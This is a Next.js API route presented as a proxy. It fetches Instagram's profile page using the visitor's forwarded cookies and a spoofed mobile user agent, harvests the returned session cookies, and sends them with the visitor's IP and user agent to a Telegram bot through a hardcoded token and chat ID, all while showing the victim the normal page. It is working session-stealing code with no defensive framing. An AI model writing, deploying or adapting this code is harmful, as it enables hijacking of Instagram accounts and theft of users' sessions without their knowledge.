// pages/api/proxy.js

export const config = {
  api: {
    bodyParser: false, // Important for streaming large HTML responses
  },
};

export default async function handler(req, res) {
  // ✅ Telegram Configuration
  const BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
  const CHAT_ID = "8569746095";

  // ✅ Mobile User-Agent to avoid Instagram bot detection
  const MOBILE_UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1";

  // ✅ Target Path: Force /profile to ensure sessionid is issued
  const targetPath = "/profile";

  // ✅ Extract Client IP and User-Agent
  const clientIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "Unknown";
  const clientUA = req.headers["user-agent"] || "Unknown";

  // ✅ Prepare Instagram Request
  const https = require("https");
  const url = require("url");

  const options = {
    hostname: "www.instagram.com",
    path: targetPath,
    method: "GET",
    headers: {
      "User-Agent": MOBILE_UA,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Connection": "keep-alive",
      "Cache-Control": "max-age=0",
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "none",
      "Sec-Fetch-User": "?1",
      "Upgrade-Insecure-Requests": "1",
      "Cookie": req.headers.cookie || "", // Forward the user's cookies
    },
  };

  try {
    const request = https.request(options, (response) => {
      // ✅ 1. Extract Cookies from Instagram's response
      const cookies = response.headers["set-cookie"] || [];
      
      // ✅ 2. Log to Telegram
      const timestamp = new Date().toISOString();
      const cookieList = cookies.map((c) => c.split(";")[0]).join("\n");
      
      const message = `
🍪 <b>Instagram Session Logged!</b>

🕒 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${clientIP}
📱 <b>UA:</b> <code>${clientUA}</code>

🍪 <b>Cookies Captured:</b>
<code>${cookieList}</code>
      `;

      // Send to Telegram
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      }).catch((err) => console.error("Telegram Error:", err));

      // ✅ 3. Stream the response to the user
      res.statusCode = response.statusCode;
      
      // Set the cookies for the user's browser
      if (cookies.length > 0) {
        res.setHeader("Set-Cookie", cookies);
      }
      
      if (response.headers["content-type"]) {
        res.setHeader("Content-Type", response.headers["content-type"] || "text/html");
      }

      // Pipe the Instagram HTML to the user
      response.pipe(res);
    });

    request.on("error", (e) => {
      console.error("Proxy Error:", e);
      res.status(500).end("Error");
    });

    request.end();

  } catch (error) {
    console.error("Server Error:", error);
    res.status(500).end("Server Error");
  }
}
